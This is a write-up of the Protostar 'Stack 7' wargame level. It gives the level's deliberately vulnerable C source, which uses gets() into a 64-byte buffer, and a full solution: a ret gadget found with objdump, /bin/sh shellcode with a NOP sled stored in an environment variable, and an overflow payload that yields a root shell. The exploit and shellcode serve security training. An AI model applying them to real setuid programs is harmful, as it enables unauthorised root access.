# Protostar - Stack 7

### About ###

>Stack6 introduces return to .text to gain code execution.
>
>The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, >otherwise looking through objdump output will suffice.
>
>This level is at `/opt/protostar/bin/stack7`


### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

### Solution 

Since we used ROP in the previous exercise, this one will be pretty straightforward.
First, we need to find the address of a `ret` instruction.

```
user@protostar:/tmp$ objdump -d /opt/protostar/bin/stack7 | grep ret
 8048383:      	c3                     	ret
 8048494:      	c3                     	ret
 80484c2:      	c3                     	ret
 8048544:      	c3                     	ret
 8048553:      	c3                     	ret
 8048564:      	c3                     	ret
 80485c9:      	c3                     	ret
 80485cd:      	c3                     	ret
 80485f9:      	c3                     	ret
 8048617:      	c3                     	ret
```

We store the shellcode in an environment variable.

```
user@protostar:/tmp$ export SHELLCODE=$(python -c "print '\x90'*200+'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
user@protostar:/tmp$ ./getenv SHELLCODE
0xbffff8b8
```

Now, we can exploit the process.

```
user@protostar:/tmp$ (python -c "print 'A'*$((80))+'\x83\x83\x04\x08\xb8\xf8\xff\xbf'"; cat;) | /opt/protostar/bin/stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA�����
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```